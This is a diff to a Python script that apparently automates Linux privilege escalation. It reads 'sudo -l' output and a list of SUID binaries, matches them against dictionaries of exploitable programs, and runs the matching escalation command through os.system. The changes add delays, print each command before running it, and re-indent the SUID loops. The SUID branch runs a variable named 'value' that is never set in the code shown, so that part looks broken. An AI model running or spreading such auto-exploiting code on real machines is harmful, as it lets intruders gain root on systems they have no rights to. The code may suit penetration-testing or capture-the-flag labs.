@@ -278,6 +278,7 @@ def sudo_l():
       last_line = sudol.readlines()[-1]
       lower_line = last_line.lower()
       print(lower_line)
+      time.sleep(5)
 
       # loop through dictionaries and print cmds if need user interaction, otherwise execute
       for key in sudo_bins_print:
@@ -293,7 +294,9 @@ def sudo_l():
             print("{}: {}".format(key,sudo_bins_exec[key]))
             os.system("echo '### {}:{} can be used for privilege escalation ###' >> /tmp/esc.txt".format(key,sudo_bins_print[key]))
             sudo_cmd = sudo_bins_exec[key].strip()
-            os.system(sudo_cmd)
+            print(sudo_cmd)
+            time.sleep(5)
+            os.system("{}".format(sudo_cmd))
             exit()
          else:
             continue
@@ -353,22 +356,22 @@ def suid():
             os.system("echo '### {} is a suid binary and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(line))
          else:
             continue
-      for key in suid_bins_print:
-         if key in suid:
-            print("\n{}: {}".format(key,suid_bins_print[key]))
-            os.system("echo '### {}:{} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key,suid_bins_print[key]))
-         else:
-            continue
+         for key in suid_bins_print:
+            if key in suid:
+               print("\n{}: {}".format(key,suid_bins_print[key]))
+               os.system("echo '### {}:{} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key,suid_bins_print[key]))
+            else:
+               continue
 
-      for key in suid_bins_exec:
-         if key in suid:
-            print("\n{}: {}".format(key,suid_bins_exec[key]))
-            os.system("echo '### {} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key,suid_bins_exec[key]))
-            suid_cmd = value.strip()
-            os.system(suid_cmd)
-            break
-         else:
-            continue
+         for key in suid_bins_exec:
+            if key in suid:
+               print("\n{}: {}".format(key,suid_bins_exec[key]))
+               os.system("echo '### {} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key,suid_bins_exec[key]))
+               suid_cmd = value.strip()
+               os.system("{}".format(suid_cmd))
+               break
+            else:
+               continue
 
 
 # try SUID executables for $PATH exploitation
